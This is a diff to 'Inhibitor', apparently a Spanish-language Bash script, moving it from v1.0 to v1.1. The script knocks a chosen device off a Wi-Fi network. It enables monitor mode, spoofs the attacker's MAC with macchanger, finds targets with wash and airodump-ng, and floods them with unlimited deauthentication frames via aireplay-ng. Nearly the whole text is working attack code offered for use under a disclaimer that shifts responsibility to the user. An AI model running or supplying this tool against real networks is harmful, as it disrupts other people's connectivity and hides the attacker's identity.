@@ -9,7 +9,7 @@ echo "                            | |   | '_ \  | '_ \  | | | '_ \  | | | __|  /
 echo "                           _| |_  | | | | | | | | | | | |_) | | | | |_  | (_) | | |   "
 echo "                          |_____| |_| |_| |_| |_| |_| |_.__/  |_|  \__|  \___/  |_|   " 
 echo "                              __________________________________________________"					
-echo "                                ︻デ═一  Created by: XDeadHackerX v1.0  ︻デ═一 " 
+echo "                                ︻デ═一  Created by: XDeadHackerX v1.1  ︻デ═一 " 
 echo "          -------------------------------------------------------------------------------------------"
 echo "          Cualquier acción y o actividad relacionada con Inhibitor es únicamente su responsabilidad"
 echo "          -------------------------------------------------------------------------------------------"
@@ -19,8 +19,8 @@ echo "[6] Desconectar a un disposito de una Red Wifi"
 echo 
 sudo airmon-ng
 echo
-read -p "Escribe la Interfaz de la Tarjeta de Red (Ej: wlan0): " interfaz
-read -p "Cortar la salida a internet para evitar futuros errores? (y/n): " opc1
+read -p "[*] Escribe la Interfaz de la Tarjeta de Red (Ej: wlan0): " interfaz
+read -p "[*] Cortar la salida a internet para evitar futuros errores? (y/n): " opc1
 echo
 if [ $opc1 = y ]
 	then
@@ -42,6 +42,9 @@ echo "--------------------->""|"
 echo "======================="
 sudo ifconfig $interfaz promisc
 sudo airmon-ng start $interfaz
+echo
+read -p "[*] Escribe la Interfaz de la Tarjeta de Red en modo Monitor (Ej: wlan0mon o wlan0): " interfaz2
+echo
 echo "======================="
 echo " Activando Modo Seguro"
 echo "======================="
@@ -54,10 +57,10 @@ sleep 1
 echo "--------------------->""|"
 echo "======================="
 echo
-sudo ifconfig "${interfaz}mon" promisc
-sudo ifconfig "${interfaz}mon" down
-sudo macchanger -a "${interfaz}mon"
-sudo ifconfig "${interfaz}mon" up
+sudo ifconfig $interfaz2 promisc
+sudo ifconfig $interfaz2 down
+sudo macchanger -a $interfaz2
+sudo ifconfig $interfaz2 up
 sleep 2
 clear
 echo
@@ -68,17 +71,17 @@ echo "                            | |   | '_ \  | '_ \  | | | '_ \  | | | __|  /
 echo "                           _| |_  | | | | | | | | | | | |_) | | | | |_  | (_) | | |   "
 echo "                          |_____| |_| |_| |_| |_| |_| |_.__/  |_|  \__|  \___/  |_|   " 
 echo "                              __________________________________________________"					
-echo "                                ︻デ═一  Created by: XDeadHackerX v1.0  ︻デ═一 " 
+echo "                                ︻デ═一  Created by: XDeadHackerX v1.1  ︻デ═一 " 
 echo "          -------------------------------------------------------------------------------------------"
 echo "          Cualquier acción y o actividad relacionada con Inhibitor es únicamente su responsabilidad"
 echo "          -------------------------------------------------------------------------------------------"
 echo
 echo
-echo "[*] Pulse Ctrl + c (Cuando aparezca por pantalla el Wifi objetivo)"
+echo "[#] Pulse Ctrl + c (Cuando aparezca por pantalla el Wifi objetivo, puede tardar hasta 1 minuto)"
 echo
-sudo wash -a -i "${interfaz}mon"
-read -p "Copia el BSSID del Wifi Objetivo y pegelo a continuacion: " bssid
-read -p "Copia el Canal (Ch) del Wifi Objetivo y pegelo a continuacion: " ch
+sudo wash -2 -5 -a -i $interfaz2
+read -p "[*] Copia el BSSID del Wifi Objetivo y pegelo a continuacion: " bssid
+read -p "[*] Copia el Canal (Ch) del Wifi Objetivo y pegelo a continuacion: " ch
 echo
 sleep 1
 echo "Listo"
@@ -92,13 +95,13 @@ echo "                            | |   | '_ \  | '_ \  | | | '_ \  | | | __|  /
 echo "                           _| |_  | | | | | | | | | | | |_) | | | | |_  | (_) | | |   "
 echo "                          |_____| |_| |_| |_| |_| |_| |_.__/  |_|  \__|  \___/  |_|   " 
 echo "                              __________________________________________________"					
-echo "                                ︻デ═一  Created by: XDeadHackerX v1.0  ︻デ═一 " 
+echo "                                ︻デ═一  Created by: XDeadHackerX v1.1  ︻デ═一 " 
 echo "          -------------------------------------------------------------------------------------------"
 echo "          Cualquier acción y o actividad relacionada con Inhibitor es únicamente su responsabilidad"
 echo "          -------------------------------------------------------------------------------------------"
 echo
 echo
-echo "[*] Pulse Ctrl + c (Cuando aparezca por pantalla la MAC/STATION del Objetivo)"
+echo "[#] Pulse Ctrl + c (Cuando aparezca por pantalla la MAC/STATION del Objetivo)"
 echo
 echo
 echo "======================="
@@ -113,9 +116,9 @@ sleep 1
 echo "--------------------->""|"
 echo "======================="
 sleep 2
-sudo airodump-ng -c $ch --bssid $bssid "${interfaz}mon"
+sudo airodump-ng -c $ch --bssid $bssid $interfaz2 --band abg
 echo
-read -p "Copia la MAC del Objetivo y pegala a continuacion: " mac
+read -p "[*] Copia la MAC del Objetivo y pegala a continuacion: " mac
 echo
 sleep 1
 echo "Listo"
@@ -129,20 +132,20 @@ echo "                            | |   | '_ \  | '_ \  | | | '_ \  | | | __|  /
 echo "                           _| |_  | | | | | | | | | | | |_) | | | | |_  | (_) | | |   "
 echo "                          |_____| |_| |_| |_| |_| |_| |_.__/  |_|  \__|  \___/  |_|   " 
 echo "                              __________________________________________________"					
-echo "                                ︻デ═一  Created by: XDeadHackerX v1.0  ︻デ═一 " 
+echo "                                ︻デ═一  Created by: XDeadHackerX v1.1  ︻デ═一 " 
 echo "          -------------------------------------------------------------------------------------------"
 echo "          Cualquier acción y o actividad relacionada con Inhibitor es únicamente su responsabilidad"
 echo "          -------------------------------------------------------------------------------------------"
 echo
 echo
-echo "[*] Pulse Ctrl + c (Para finalizar el Ataque y el Objetivo se reconecte al Wifi)"
+echo "[#] Pulse Ctrl + c (Para finalizar el Ataque y el Objetivo se reconecte al Wifi)"
 echo
 echo
 echo "========================================================================================="
 echo "                      El Objetivo ($mac) esta siendo Atacado"
 echo "========================================================================================="
 echo
-sudo aireplay-ng --deauth 0 -a $bssid -c $mac "${interfaz}mon"
+sudo aireplay-ng --deauth 0 -a $bssid -c $mac $interfaz2
 echo
 echo
 sleep 1
@@ -160,12 +163,12 @@ sleep 1
 echo "---------------------------->""|"
 echo "=============================="
 echo
-sudo ifconfig "${interfaz}mon" down
-sudo macchanger -p "${interfaz}mon"
-sudo ifconfig "${interfaz}mon" up
+sudo ifconfig $interfaz2 down
+sudo macchanger -p $interfaz2
+sudo ifconfig $interfaz2 up
 sleep 2
-sudo ifconfig "${interfaz}mon" -promisc
-sudo airmon-ng stop "${interfaz}mon"
+sudo ifconfig $interfaz2 -promisc
+sudo airmon-ng stop $interfaz2
 sudo ifconfig $interfaz -promisc
 sudo systemctl restart NetworkManager.service
 sleep 1
